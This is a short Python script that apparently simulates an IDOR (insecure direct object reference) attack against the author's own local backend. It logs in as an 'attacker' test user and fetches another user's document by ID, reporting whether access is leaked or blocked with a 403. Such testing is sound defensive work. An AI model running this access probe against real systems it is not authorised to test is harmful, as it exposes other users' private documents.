import requests
import sys

# Configuration
BASE_URL = "http://127.0.0.1:8000"  # Local backend
LOGIN_ENDPOINT = "/api/auth/login/"
DOC_DETAIL_ENDPOINT = "/api/documents/{}/"

# IDs for simulation (Adjust these based on your actual DB state if needed)
# Victim = User 1, Document 1
# Attacker = User 2
VICTIM_DOC_ID = 1 

def get_token(username, password):
    print(f"[*] Logging in as {username}...")
    response = requests.post(f"{BASE_URL}{LOGIN_ENDPOINT}", json={
        "username": username,
        "password": password
    })
    if response.status_code == 200:
        print(f"[+] Login successful for {username}")
        return response.json().get("access")
    else:
        print(f"[!] Login failed for {username}: {response.status_code}")
        print(response.json())
        return None

def simulate_attack(token, doc_id):
    print(f"[*] Attempting to access Document ID: {doc_id}...")
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(f"{BASE_URL}{DOC_DETAIL_ENDPOINT.format(doc_id)}", headers=headers)
    
    if response.status_code == 200:
        print("\n" + "!" * 50)
        print("!!! ATTACK SUCCESSFUL: IDOR VULNERABILITY FOUND !!!")
        print(f"!!! Leaked Document Data: {response.json().get('file_name', 'Unknown')}")
        print("!" * 50 + "\n")
    elif response.status_code == 403:
        print("\n" + "=" * 50)
        print("[-] ATTACK FAILED: 403 Forbidden (Security Working)")
        print("=" * 50 + "\n")
    elif response.status_code == 404:
        print(f"[?] Document {doc_id} not found. Please ensure it exists in the database.")
    else:
        print(f"[!] Unexpected Status Code: {response.status_code}")
        print(response.json())

if __name__ == "__main__":
    print("--- IDOR Attack Simulation ---\n")
    
    # YOU NEED TWO USERS FOR THIS DEMO. 
    # Let's assume 'attacker' is User 2 and 'sanjeev' is User 1.
    # Update these credentials to match your local setup.
    ATTACKER_USERNAME = "attacker"
    ATTACKER_PASSWORD = "Password123!"
    
    token = get_token(ATTACKER_USERNAME, ATTACKER_PASSWORD)
    
    if token:
        simulate_attack(token, VICTIM_DOC_ID)
    else:
        print("\n[!] Please ensure you have created an 'attacker' user with password 'Password123!' first.")
